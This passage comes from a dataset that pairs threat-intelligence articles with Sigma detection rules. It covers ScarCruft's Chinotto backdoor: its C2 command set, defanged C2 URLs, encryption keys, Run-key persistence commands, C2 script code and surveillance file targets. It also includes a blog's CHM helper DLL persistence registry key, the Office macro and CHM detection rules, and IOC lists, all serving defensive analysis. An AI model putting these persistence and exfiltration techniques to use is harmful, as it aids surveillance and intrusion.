discovered from the host investigation. One of the characteristics of this malware is that it contains a lot of garbage code to impede analysis. During runtime, the malware copies unused data to the allocated buffer before copying the real value; or allocates an unused buffer, filling it with meaningless data, and never uses it.\n\nIt also restores functional strings such as C2 addresses and debugging messages to the stack at runtime. The malware creates a mutex and fetches the C2 addresses, which are different for each sample we discovered:\n\n```\nMutex: NxaNnkHnJiNAuDCcoCKRAngjHVUZG2hSZL03pw8Y\nC2 address: hxxp://luminix.openhaja[.]com/bbs/data/proc1/proc.php\n```\n\nIn order to generate the identification value of the victim, the malware acquires both computer and user name and combines them in the format ‘%computer name%_%user name%’. Next, it encrypts the acquired string with the XOR key ‘YFXAWSAEAXee12D4’ and encodes it with base64.\n\nThe backdoor continuously queries the C2 server, awaiting commands from the malware operator. We observed an early version of Chinotto malware (MD5 55afe67b0cd4a01f3a9a6621c26b1a49) which, while it also follows this simple principle, uses a hard-coded backdoor command ‘scap’. This means this specific sample is only designed for exfiltrating the victim’s screenshot.\n\nThe Chinotto malware shows fully fledged capabilities to control and exfiltrate sensitive information from the victims.\n\n| Command    | Description                                                                                                                                                                                                                                                                                                                                                                         |\n| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| ref:       | Send beacon to the C2 server: `http://[C2 URL]?ref=id=%s&type=hello&direction=send`                                                                                                                                                                                                                                                                                                 |\n| cmd:       | Execute Windows commands and save the result to the `%APPDATA%\\s5gRAEs70xTHkAdUjl_DY1f.dat` file after encrypting with a one-byte XOR key                                                                                                                                                                                                                                           |\n| down:      | Download file from the remote server                                                                                                                                                                                                                                                                                                                                                |\n| up:        | Upload file                                                                                                                                                                                                                                                                                                                                                                         |\n| state:     | Upload log file (`s5gRAEs70xTHkAdUjl_DY1fD.dat`)                                                                                                                                                                                                                                                                                                                                    |\n| regstart:  | Copy current malware to the ​​CSIDL_COMMON_DOCUMENTS folder and execute command to register file to run registry: `reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v a2McCq /t REG_SZ /d %s /f`                                                                                                                                                      |\n| cleartemp: | Remove files from folder `%APPDATA%\\s5gRAEs70xTHkAdUjl_DY1fD`                                                                                                                                                                                                                                                                                                                       |\n| updir:     | Archive directory and upload it. Archive is XOR encoded using the same key used when creating the identification value: ‘YFXAWSAEAXee12D4’                                                                                                                                                                                                                                          |\n| init:      | Collect files with following extensions from the paths CSIDL_DESKTOP, CSIDL_PERSONAL(CSIDL_MYDOCUMENTS), CSIDL_MYMUSIC, CSIDL_MYVIDEO. Downloads and upload them to C2 server: `jpg | jpeg | png | gif | bmp | hwp | doc | docx | xls | xlsx | xlsm | ppt | pptx | pdf | txt | mp3 | amr | m4a | ogg | aac | wav | wma | 3gpp | eml | lnk | zip | rar | egg | alz | 7z | vcf | 3gp` |\n| scap:      | Take a screenshot, save it to the folder `%appdata%\\s5gRAEs70xTHkAdUjl_DY1fD` in an archived format. The file to store the screenshot has an ‘e_’ prefix and 10 randomly generated characters as a filename. When uploading the screenshot file, it uses ‘wrpdwRwsFEse’ as the filename                                                                                             |\n| run:       | Run Windows commands with ShellExecuteW API                                                                                                                                                                                                                                                                                                                                         |\n| chdec:     | Download an encrypted file and decrypt it via CryptUnprotectData API                                                                                                                                                                                                                                                                                                                |\n| update:    | Download updated malware and register it: `reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v m4cVWKDsa9WxAWr41iaNGR /t REG_SZ /d %s /f`                                                                                                                                                                                                                    |\n| wait:      | Sleep for 30 minutes                                                                                                                                                                                                                                                                                                                                                                |\n| wakeup:    | Wake up after 2.5 seconds                                                                                                                                                                                                                                                                                                                                                           |\n\nAnother malware sample (MD5 04ddb77e44ac13c78d6cb304d71e2b86) that demonstrated a slight difference during runtime was discovered from the same victim. This is the same fully featured backdoor, but it loads the backdoor command using a different scheme. The malware checks for the existence of a ‘*.zbpiz’ file in the same folder. If it exists, it loads the file’s content and uses it as a backdoor command after decrypting. The malware authors keep changing the capabilities of the malware to evade detection and create custom variants depending on the victim’s scenario.\n\nIn addition, there are different Windows executable variants of the Chinotto malware. Apart from the conventional Chinotto malware mentioned above, a different variant contains an embedded PowerShell script. The spawned PowerShell command has similar functionality to the PowerShell we found from the victim. However, it contains additional backdoor commands, such as uploading and downloading capabilities. Based on the build timestamp of the malware, we assess that the malware author used the PowerShell embedded version from mid-2019 to mid-2020 and started to use the malicious, PowerShell-less Windows executable from the end of 2020 onward.\n\n## Android Chinotto\n\nBased on the C2 communication pattern, we discovered an Android application version of Chinotto malware (MD5 56f3d2bcf67cf9f7b7d16ce8a5f8140a). This malicious APK requests excessive permissions according to the AndroidManifest.xml file. To achieve its purpose of spying on the user, these apps ask users to enable various sorts of permissions. Granting these permissions allows the apps to collect sensitive information, including contacts, messages, call logs, device information, and audio recordings. Each sample has a different package name, with the analyzed sample bearing “com.secure.protect” as a package name.\n\nThe malware sends its unique device ID in the same format as the Windows executable version of Chinotto.\n\n```\nBeacon URI pattern: [C2 url]?type=hello&direction=send&id=[Unique Device ID]\n```\n\nNext, it receives a command after the following HTTP request:\n\n```\nRetrieve commands: [C2 url]?type=command&direction=receive&id=[Unique Device ID]\n```\n\nIf the delivered data from the C2 server is not “ERROR” or “Fail”, the malware starts to carry out backdoor operations.\n\n| Command    | URI pattern                                                         | Description|\n| ---------- | ------------------------------------------------------------------- ||\n| ref:       | `?type=hello&direction=send&id=`                                    | Send the same beacon request to the C2 server                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| down       | `?type=file&direction=send&id=`                                     | Upload the temporary file (`/sdcard/.temp-file.dat`) to the C2 server and remove it from local storage.                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| UriP       | `?type=file&direction=send&id=`                                     | Save temporary file path to the result file (`/sdcard/result-file.dat`) and upload the temporary file.                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| UploadInfo | `?type=hello&direction=send&id=`<br>`?type=file&direction=send&id=` | After sending a beacon, collect the following information to the `/icloud/tmp-web` path: <ul><li>Info.txt: Phone number, IP address, SDK version (OS version), Temporary file path</li><li>Sms.txt: Save all text messages with JSON format</li><li>Calllog.txt: Save all call logs with JSON format</li><li>Contact.txt: Save all contact lists with JSON format</li><li>Account.txt: Save all account information with JSON format</li></ul> Upload collected file after archiving. The archived file is encrypted by AES with the key “3399CEFC3326EEFF”. |\n| UploadFile | `?type=file&direction=send&id=`                                     | Execute command `cd /sdcard;ls -alR`, save the result to the temporary file (`/sdcard/.temp-file.dat`) and upload it. Upload all thumbnails and photos after encrypting via AES and the key “3399CEFC3326EEFF”.                                                                                                                                                                                                                                                                                                                                              |\n| ETC        | `?type=file&direction=send&id=`                                     | Execute command saving the result to the result file (`/sdcard/result-file.dat`) and upload the result                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n\nWe found that the actor had an interest in a more specific file list in one variant (MD5 cba17c78b84d1e440722178a97886bb7). The ‘UploadFile’ command of this variant uploads specific files to the C2 server. The AMR file is an audio file generally used for recording phone calls. Also, Huawei cloud and Tencent services are two of the targets. To surveil the victim, the list includes target folders as well as `/Camera`, `/Recordings`, `/KakaoTalk` (a renowned Korean messenger), `/문건` (documents), `/사진` (pictures), and `/좋은글` (good articles).\n\n```image\nAlt: Targeted files and folders\nDescription: The image depicts a segment of code likely related to the Chinotto malware's functionality. Specifically, it shows a series of commands that process important files from various directories on an Android device, including audio recordings, pictures, and specific app folders like those for Huawei Cloud and Tencent services. The code suggests that the malware is designed to identify and handle files of interest, which could then be uploaded to a command and control (C2) server for malicious purposes.\nTranscription: |\n  if (paramBoolean2) {\n      processImportantFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), \"\");\n      processImportantFile(Environment.getDataDirectory(), \".amr\");\n      processImportantFile(Environment.getExternalStorageDirectory(Environment.DIRECTORY_PICTURES), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Huawei/CloudDrive/.thumbnail\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/Download\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/WeChat\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/Weixin\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Camera\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Recordings\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/KakaoTalk\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/사진\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/썸네일\"), \"\");\n      uploadToWeb();\n  }\n  return;\n```\n\n*__Targeted files and folders__*\n\nTo sum up, the actor targeted victims with a probable spear-phishing attack for Windows systems and smishing for Android systems. The actor leverages Windows executable versions and PowerShell versions to control Windows systems. We may presume that if a victim’s host and mobile are infected at the same time, the malware operator is able to overcome two-factor authentication by stealing SMS messages from the mobile phone. After a backdoor operation with a fully featured backdoor, the operator is able to steal any information they are interested in. Using the stolen information, the actor further leverages their attacks. For example, the group attempts to infect additional valuable hosts and contact potential victims using stolen social media accounts or email accounts.\n\n```image\nAlt: Attack procedure\nDescription: The image illustrates the attack procedure of the ScarCruft group targeting victims. It features a flowchart that highlights the steps involved in the attack process, including: 1. Infection methods such as spear phishing, smishing, and watering hole tactics. 2. Surveillance of the victims through a C2 server and backdoor operations. 3. Contacting the next target using stolen social media credentials. 4. Sending spear-phishing emails to potential victims using these credentials. The diagram includes icons representing mobile devices, PCs, and the C2 server, visually mapping out the relationship and flow of actions among the actors and their targets.\nTranscription: |\n  1. Infect with spear phishing, smishing, watering hole\n     |\n     v\n  2. Surveil the victims\n     |\n     v\n     +------------------+\n     |                  |\n     |      Victims     |\n     |                  |\n     +------------------+\n     |                  |\n     |   Mobile         |\n     |                  |\n     |   PC             |\n     |                  |\n     +------------------+\n     |                  |\n     |   Windows        |\n     |   executable     |\n     |   version        |\n     |                  |\n     |   PowerShell     |\n     |   version        |\n     +------------------+\n     |\n     v\n  3. Contact next target with stolen social media credentials\n     |\n     v\n  4. Send spear-phishing email using stolen credentials\n     |\n     v\n  Potential victim\n  \n  C2 server\n     |\n     v\n  Backdoor operations\n```\n\n*__Attack procedure__*\n\n## Older malicious HWP documents\n\nThe threat actor behind this campaign delivered the same malware with a malicious HWP file. At that time, lures related to COVID-19 and credential access were used.\n\n| HWP hash                         | HWP file name                                                            | Dropped payload hash                                   |\n| -------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------ |\n| f17502d3e12615b0fa8868472a4eabfb | 코로나19 재감염 사례-백신 무용지물.hwp (Covid-19 reinfection case-Useless vaccine.hwp) | 72e5b8ea33aeb083631d1e8b302e76af (Visual Basic Script) |\n| c155f49f0a9042d6df68fb593968e110 | 계정기능 제한 안내.hwp (Notice of limitation of account.hwp)                     | 5a7ef48fe0e8ae65733db64ddb7f2478 (Windows executable)  |\n\nThe Visual Basic Script created by the first HWP file (MD5 f17502d3e12615b0fa8868472a4eabfb) has similar functionalities to the Chinotto malware. It also uses the same HTTP communication pattern. The second payload dropped from the malicious HWP is a Windows executable executing an embedded PowerShell script with the same functionalities. These discoveries reveal related activity dating back to at least mid-2020.\n\n## Infrastructure\n\nIn this campaign, the actor relied solely on compromised web servers, mostly located in South Korea. During this research, we worked closely with the local CERT to take down the attacker’s infrastructure and had a chance to look into one of the scripts on the C2 servers that control the Chinotto malware. The C2 script (named “do.php”) uses several predefined files to save the client’s status (`shakest`) and commands (`comcmd`). Also, it parses several parameters (`id`, `type`, `direction`, `data`) delivered by the HTTP request from the implant:\n\n```\n$type = \"\"; # 'type' parameter\n$shakename = \"shakest\"; # Save client status\n$comcmdname = \"comcmd\"; # Save commands\n$btid = \"\"; # Client unique ID\n$direction = \"\"; # 'direction' parameter\n$data = \"\"; # 'data' parameter\n\nif (isset($_GET['id'])) {\n    $btid = $_GET['id'];\n}\n\nif (isset($_GET['type'])) {\n    $type = $_GET['type'];\n}\n\nif (isset($_GET['direction'])) {\n    $direction = $_GET['direction'];\n}\n\nif (isset($_GET['data'])) {\n    $data = $_GET['data'];\n}\n\n$comname = $btid . \"\";\n$comresname = $comname . \"-result\";\n```\n\nIn order to control the client, the C2 script uses HTTP parameters. First, it checks the value of the ‘type’ parameter. The ‘type’ parameter carries four values: hello, command, result, and file.\n\n| Value of ‘type’ param | Description                                                                |\n| --------------------- | -------------------------------------------------------------------------- |\n| hello                 | Report and control the client status                                       |\n| command               | Hold the command from the operator or retrieve the command from the client |\n| result                | Upload the command execution result or retrieve the command                |\n| file                  | Upload file to the C2 server                                               |\n\n### ‘hello’ type\n\nWhen the script receives the ‘type=hello’ parameter, it checks the value of ‘direction’. In this routine, the script checks the status of the client. The malware operator saves the client status to a specific file, the ‘shakest’ file in this case. If the ‘send’ value is being received, the client status is set to ‘ON’. If ‘receive’ is set as well, the client’s status log file is sent (likely in order to send the status of clients to the malware operator). The ‘refresh’ value is for setting all clients to ‘OFF’ and ‘release’ is used to initialize the command file. The client just replies ‘OK’.\n\n```image\nAlt: ‘type=hello’ commands\nDescription: The image is a flowchart illustrating the commands associated with a script that processes a 'type=hello' parameter. It details the decision-making process based on the 'direction' parameter, showing various outcomes such as setting the client status, returning log files, refreshing client status, initializing command files, and the client's response. The flowchart effectively summarizes the functionality and operational commands related to the ScarCruft malware.\nTranscription: |\n  Check 'type' param\n           |\n         hello\n           |\n     check the 'direction'\n           |\n     -------------------------\n     |          |           |\n    send      receive     refresh\n     |          |           |\n  Set client   Return    Set all client\n  status as    client    status to 'OFF' \n     'ON'      status    and command file to 'ref:'\n                log file\n           |\n         release\n           |\n  Initialize command file\n           |\n         client\n           |\n        echo 'OK'\n```\n\n*__‘type=hello’ commands__*\n\n### ‘command’ type\n\nIn order to manage the implant’s commands, the C2 script handles several additional parameters. If the ‘type=command’ alongside ‘direction=receive’ is set, it issues a request from the client to retrieve a command.\n\nThere are two kinds of command files: common commands like an initial command or commands sent to all clients, and individual commands for a specific client. If an individual command exists for a client, it delivers it. Otherwise, the client is sent a common command. If the ‘direction’ parameter is set to ‘send’, the request is coming from the malware operator in order to save the sent command in the C2 server. Using this request, the operator can set two commands files: common command or individual command. If the ‘botid’ parameter contains ‘cli’, it means this request is for setting a common command file. If the ‘data’ parameter contains ‘refclear:’, the common command file gets initialized. Otherwise, the ‘data’ value is saved to the common command file. If ‘botid’ is not ‘cli’, it means this request is directed to an individual command file. The process of saving the individual command file is the same as the process used for saving the common command.\n\n```image\nAlt: type=command commands\nDescription: The image is a flowchart illustrating the process of handling commands for a malware implant. It shows decision points based on the parameters 'type', 'direction', 'botid', and 'data'. The flowchart outlines the steps for delivering commands or saving them to a command file, distinguishing between common and individual command files, and detailing the actions associated with different parameter values.\nTranscription: |\n  Check 'type' param\n          |\n       command\n          |\n  check the 'direction'\n         / \\\n    receive  send\n      |       |\n  Deliver the command\n              |\n         check the 'botid'\n          /       \\\n        cli       else\n         |          |\n   check the 'data'  |\n        / \\         |\n  refclear:   else   |\n      |         |    |\n  Initialize common  |\n  command file      check the 'data'\n                    /      \\\n               refclear:    else\n                    |         |\n            Initialize individual\n                command file\n                    |\n        Save the 'data' parameter to\n          individual command file\n```\n\n*__type=command commands__*\n\n### ‘result’ type\n\nWhen uploading command execution results coming from the implant, the script sets the ‘type’ parameter to ‘result’. If the ‘direction’ parameter equals ‘send’, it saves the value of the ‘data’ parameter to the individual result file: “[botid]-result”. The ‘receive’ value of the ‘direction’ parameter means retrieving the individual result file. The script then sends the result file to the operator after encoding it with base64.\n\n### ‘file’ type\n\nThe last possible ‘type’ command is ‘file’. This value is used for exfiltrating files from the victim. If a file upload succeeds, the script sends the message ‘SEND SUCCESS’. Otherwise, it sends ‘There was an error uploading the file, please try again!’.\n\nWe discovered that the malware operator used a separate webpage to monitor and control the victims. From several compromised C2 servers we see a control page carrying a ‘control.php’ file name.\n\n```image\nAlt: Control page from this case\nDescription: The image displays a control page interface used by the ScarCruft malware operator. It shows a list of infected hosts with their status (e.g., \"PC: ON\") on the left panel. The right panel allows the operator to input commands and view results from the client. The interface includes a 'Bot' field displaying 'USER-PC', a command input box, and a result area for displaying command outcomes, along with a 'Refresh' button.\nTranscription: |\n  -PC : ON\n  Refresh\n  \n  Bot\n  USER-PC\n  \n  Comm\n  Enter command..\n  \n  Result\n  Command result is here...\n```\n\n*__Control page from this case__*\n\nThe control page shows a simple structure. The operator can see a list of infected hosts in the left panel with the corresponding status “ON” or “OFF”. Based on this information, the operator is able to issue a command using the right panel and watch the result from the client.\n\n## Victims\n\nWe began this research by providing support to human rights activists and defectors from North Korea against an actor seeking to surveil and track them.\n\nAdditionally, we discovered further victims we couldn’t profile from analyzing the C2 servers. From analyzing the attacker’s infrastructure, we found 75 client connections between January 2021 and February 2021. Most IP addresses seem to be Tor or VPN connections, which are likely to be either from researchers or the malware operators.\n\nAnalyzing other C2 servers, we found more information about possible additional victims. Excluding connections coming from Tor, there are only connections coming from South Korea. Based on the IP addresses, we could distinguish four different suspected victims located in South Korea, and determine their operating system and browser used based on user-agent information:\n\nVictim A connected to the C2 server from July 16 to September 5 and has outdated versions of Windows OS and Internet Explorer. Victim B connected to this server on September 4 and operates Windows 8 and Internet Explorer 10. While we were investigating the C2 server, Victim D kept connecting to it, using Windows 10 with Chrome version 78.\n\n```image\nAlt: Timeline of victims\nDescription: The image displays a timeline of victims targeted by the ScarCruft threat actor, detailing their connection periods along with the operating systems and browsers used. The timeline is structured by weeks across the months of July, August, and September, indicating specific victims (A, B, C, D) and their respective connection details. For example, Victim A's connection is noted from July 16 to September 5 using Internet Explorer 6 on Windows XP SP2. Victim B is shown to have connected on September 4 using Internet Explorer 10 on Windows 8, while Victim C and Victim D are connected during September using Chrome on Windows 10.\nTranscription: |\n  07\n  W1   W2   W3   W4\n  Victim A (Jul 16 - Sep 5), Internet Explorer 6 on Windows XP SP2\n  \n  08\n  W1   W2   W3   W4\n  Victim B (Sep 4 - Sep 9), Internet Explorer 10 on Windows 8\n  \n  09\n  W1   W2   W3   W4\n  Victim C (Sep 10 - Sep 12), Chrome 78 on Windows 10\n  Victim D (Sep 12 - Sep 29), Chrome 78 on Windows 10\n```\n\n*__Timeline of victims__*\n\nTo sum up, this campaign is targeting entities in South Korea, which is a top point of interest for ScarCruft. Based on our findings, we also assume that the threat actor targeted individuals rather than specific companies or organizations.\n\n## Attribution\n\nWe discovered several code overlaps with old ScarCruft malware named POORWEB. At first, when Chinotto malware uploads the file to the C2 server, it uses the HTTP POST request with a boundary generated with a random function. When Chinotto malware (MD5 00df5bbac9ad059c441e8fef9fefc3c1) generates a boundary value, it executes the random() function twice and concatenates each value. The generation process is not exactly the same, but it utilizes a similar scheme as the old POORWEB malware (MD5 97b35c34d600088e2a281c3874035f59).\n\n```image\nAlt: HTTP boundary generation routine\nDescription: The image shows a side-by-side comparison of code snippets, illustrating the similarities between the old POORWEB malware and the Chinotto malware. The top portion displays the code for the old POORWEB malware, highlighting its boundary generation routine, while the bottom section presents the corresponding routine from the Chinotto malware. The code uses random values to generate a boundary string, displaying the overlap in methods between the two malware types.\nTranscription: |\n  return 0;\n  memset(buf, 0, sizeof(buf));\n  memset(v39, 0, sizeof(v39));\n  sprintf(v39, \"------%05x%08x\", random_value2 % 0xF6575, random_value1);\n  v18 = 0;\n  \n  random_value1 = rand();\n  random_value2 = rand();\n  strcpy(&Format[36], \"$\");\n  strcpy(Format, \"------%06x%07x\");\n  sprintf(boundary, Format, random_value1 % 0xDACB48, random_value2 % 0x38789FE);\n```\n\n*__HTTP boundary generation routine__*\n\nMoreover, there is additional code overlap with Document Stealer malware (MD5 cff9d2f8dae891bd5549bde869fe8b7a) that was previously utilized with POORWEB malware. When the Chinotto malware checks the response from the C2 server, it checks whether the response is ‘HTTP/1.1 200 OK’ and not ‘error’. This Document Stealer malware also has the same routine to check responses from the C2 server.\n\n```image\nAlt: C2 response check routine\nDescription: The image displays two code snippets related to malware behavior. The top snippet is labeled 'Document Stealer' and shows a routine that checks for a successful HTTP response ('HTTP/1.1 200 OK') and verifies that there is no 'error' in the response data. The bottom snippet is labeled 'Chinotto' and includes similar functionality for checking the HTTP response. Both pieces of code illustrate the methods used by the respective malware to interact with a Command and Control (C2) server, emphasizing their overlapping techniques.\nTranscription: |\n  if ( select(0, &writefds, 0, &timeout) >= 1\n      && recv(v15, buf_for_recv_data, 3000, 0)\n      && strstr(buf_for_recv_data, \"HTTP/1.1 200 OK\")\n      && strstr(buf_for_recv_data, \"\\r\\n\\r\\n\")\n      && !strstr(buf_for_recv_data, \"error</b>\") )\n  \n  Document Stealer\n  \n  if ( select(0, &writefds, 0, &timeout) >= 1 )\n  {\n      if ( recv((SOCKET)v28, buf_for_recv_data, 4096, 0) )\n      {\n          memset(SubStr, 0, sizeof(SubStr));\n          sprintf(SubStr, \"%s\", \"HTTP/1.1 200 OK\");\n          if ( strstr(buf_for_recv_data, SubStr)\n              && strstr(buf_for_recv_data, \"\\r\\n\\r\\n\")\n              && !strstr(buf_for_recv_data, \"error</b>\") )\n      }\n  }\n  \n  Chinotto\n```\n\n*__C2 response check routine__*\n\nApart from code similarity, historically, ScarCruft group is known to surveil individuals related to North Korea such as journalists, defectors, diplomats, and government employees. The target of this attack is within the same scope as previous ScarCruft group campaigns. Based on the victimology and several code overlaps, we assess with medium confidence that this cyber-espionage operation is related to the ScarCruft group.\n\n## Conclusions\n\nMany journalists, defectors, and human rights activists are targets of sophisticated cyberattacks. Unlike corporations, these targets typically don’t have sufficient tools to protect against and respond to highly skilled surveillance attacks. One of the purposes of our team is to help individuals targeted by APT groups. This research stemmed from this kind of endeavor. Our collaboration with the local CERT allowed us to gain a unique look into ScarCruft’s infrastructure setup and allowed us to discover many technical details.\n\nUsing these findings, we found additional Android variants of the same malware, which has been invaluable in understanding and tracking ScarCruft TTPs. Moreover, while hunting for related activity, we uncovered an older set of activity dating back to mid-2020, possibly indicating that ScarCruft operations against this set of individuals have been operating for a longer period of time.\n\n## Indicators of compromise\n\n**Malicious documents**\n\n| MD5                              | File name                   |\n| -------------------------------- | --------------------------- |\n| baa9b34f152076ecc4e01e35ecc2de18 | 북한의 최근 정세와 우리의 안보.doc       |\n| 7d5283a844c5d17881e91a5909a5af3c | 화학원료.doc (similar document) |\n\n**HTA file**\n\n| MD5                              | File name |\n| -------------------------------- | --------- |\n| e9e13dd4434e2a2392228712f73c98ef | 1.html    |\n\n**Windows executable Chinotto**\n\n| MD5                              | File name      |\n| -------------------------------- | -------------- |\n| 00df5bbac9ad059c441e8fef9fefc3c1 | alyakscan.exe  |\n| 04ddb77e44ac13c78d6cb304d71e2b86 | anprotect5.exe |\n| 55afe67b0cd4a01f3a9a6621c26b1a49 |                |\n| 93bcbf59ac14e14c1c39a18d8ddf28ee |                |\n\n**PowerShell embedded Chinotto**\n\n- c7c3b03108f2386022793ed29e621343\n- 5a7ef48fe0e8ae65733db64ddb7f2478\n- b06c203db2bad2363caed1c0c11951ae\n- f08d7f7593b1456a087eb9922507c743\n- 0dd115c565615651236fffaaf736e377\n- d8ad81bafd18658c52564bbdc89a7db2\n\n**Android application Chinotto**\n\n- 71b63d2c839c765f1f110dc898e79d67\n- c9fb6f127ca18a3c2cf94e405df67f51\n- 3490053ea54dfc0af2e419be96462b08\n- cba17c78b84d1e440722178a97886bb7\n- 56f3d2bcf67cf9f7b7d16ce8a5f8140a\n\n**Payload hosting URLs**\n\n- `hxxps://api[.]onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/root/content`\n- `hxxp://www[.]djsm.co[.]kr/js/20170805[.]hwp`\n\n**Command and control server**\n\n- `hxxp://luminix[.]openhaja[.]com/bbs/data/proc1/proc[.]php`\n- `hxxp://luminix[.]kr/bbs/data/proc/proc[.]php`\n- `hxxp://kjdnc[.]gp114[.]net/data/log/do[.]php`\n- `hxxp://kumdo[.]org/admin/cont/do[.]php`\n- `hxxp://haeundaejugong[.]com/editor/chinotto/do[.]php`\n- `hxxp://haeundaejugong[.]com/data/jugong/do[.]php`\n- `hxxp://doseoul[.]com/bbs/data/hnc/update[.]php`\n- `hxxp://hz11[.]cn/jquery-ui-1[.]10[.]4/tests/unit/widget/doc/pu[.]php`\n\n## MITRE ATT&CK mapping\n\n| Tactic                   | Technique | Technique Name                                                      |\n| ------------------------ | --------- | ------------------------------------------------------------------- |\n| **Resource Development** | T1584.006 | Compromise Infrastructure: Web Services                             |\n| **Initial Access**       | T1566.001 | Phishing: Spear-phishing Attachment                                 |\n| **Execution**            | T1059.001 | Command and Scripting Interpreter: PowerShell                       |\n|                          | T1059.005 | Command and Scripting Interpreter: Visual Basic                     |\n| **Persistence**          | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder |\n| **Defense Evasion**      | T1140     | Deobfuscate/Decode Files or Information                             |\n|                          | T1036.005 | Masquerading: Match Legitimate Name or Location                     |\n| **Discovery**            | T1033     | System Owner/User Discovery                                         |\n|                          | T1082     | System Information Discovery                                        |\n| **Collection**           | T1113     | Screen Capture                                                      |\n|                          | T1560.002 | Archive Collected Data: Archive via Library                         |\n| **Command and Control**  | T1071.001 | Application Layer Protocol: Web Protocols                           |\n|                          | T1573.001 | Encrypted Channel: Symmetric Cryptography                           |\n| **Exfiltration**         | T1041     | Exfiltration Over C2 Channel                                        |",
    "sigma_rule": {
      "title": "Office Macros Warning Disabled",
      "id": "91239011-fe3c-4b54-9f24-15c86bb65913",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\VBAWarnings",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_vba_warnings_tamper.yml",
    "id": "982"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/",
    "markdown": "# Beyond good ol’ Run key, Part 76\n\nPosted on 2018-04-22\n\nHere’s yet another trick you can use to achieve persistence; this time the DLL of your choice will be loaded anytime the old-school .chm file is opened. While the documentation in this format slowly disappears from new programs you can still find plenty of software that uses it.\n\nIn order to achieve the persistence this way one has to add the following Registry key:\n\n```\n[HKEY_CURRENT_USER\\Software\\Microsoft\\HtmlHelp Author]\n\"location\"=\"c:\\\\test\\\\test.dll\"\n```",
    "sigma_rule": {
      "title": "Potential Persistence Via CHM Helper DLL",
      "id": "976dd1f2-a484-45ec-aa1d-0e87e882262b",
      "status": "test",
      "description": "Detects when an attacker modifies the registry key \"HtmlHelp Author\" to achieve persistence",
      "references": [
        "https://persistence-info.github.io/Data/htmlhelpauthor.html",
        "https://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Software\\Microsoft\\HtmlHelp Author\\Location",
            "\\Software\\WOW6432Node\\Microsoft\\HtmlHelp Author\\Location"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_chm.yml",
    "id": "992"
  },
  {
    "url": "https://twitter.com/nas_bench/status/1626648985824788480",
